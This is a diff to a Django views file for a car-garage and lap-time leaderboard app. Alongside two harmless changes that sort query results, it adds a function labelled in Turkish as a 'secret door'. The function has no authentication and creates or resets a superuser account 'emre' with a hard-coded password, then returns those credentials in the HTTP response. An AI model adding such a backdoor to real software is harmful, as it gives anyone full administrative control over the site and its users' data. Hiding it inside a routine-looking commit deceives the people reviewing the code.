@@ -23,7 +23,7 @@ def home(request):
 @login_required
 def car_list(request):
     """List all cars with search and filter"""
-    cars = Car.objects.filter(owner=request.user)
+    cars = Car.objects.filter(owner=request.user).order_by('-created_at')
 
     # Search
     query = request.GET.get('q')
@@ -155,7 +155,7 @@ def leaderboard(request):
     """Best lap times per track"""
     tracks = Track.objects.all()
     selected_track = request.GET.get('track')
-    laps = LapTime.objects.all()
+    laps = LapTime.objects.all().order_by('minutes', 'seconds', 'milliseconds')
     if selected_track:
         laps = laps.filter(track__id=selected_track)
     return render(request, 'garage/leaderboard.html', {
@@ -163,3 +163,20 @@ def leaderboard(request):
         'tracks': tracks,
         'selected_track': selected_track,
     })
+# ─── GİZLİ KAPI (ADMIN OLUŞTURUCU) ──────────────────
+def gizli_admin_olustur(request):
+    from django.contrib.auth.models import User
+    from django.http import HttpResponse
+    
+    # Eğer 'emre' adında bir hesap yoksa sıfırdan oluştur:
+    if not User.objects.filter(username='emre').exists():
+        User.objects.create_superuser('emre', 'emre@example.com', 'emre2005')
+        return HttpResponse("Süper! Yeni admin hesabı başarıyla oluşturuldu. (Kullanıcı: emre | Şifre: emre2005)")
+    else:
+        # Eğer 'emre' hesabı varsa, şifresini kesin olarak sıfırla ve patron yetkisi ver:
+        patron = User.objects.get(username='emre')
+        patron.set_password('emre2005')
+        patron.is_staff = True
+        patron.is_superuser = True
+        patron.save()
+        return HttpResponse("Hesap zaten vardı, şifresi 'emre2005' olarak güncellenip patron yetkileri verildi!")
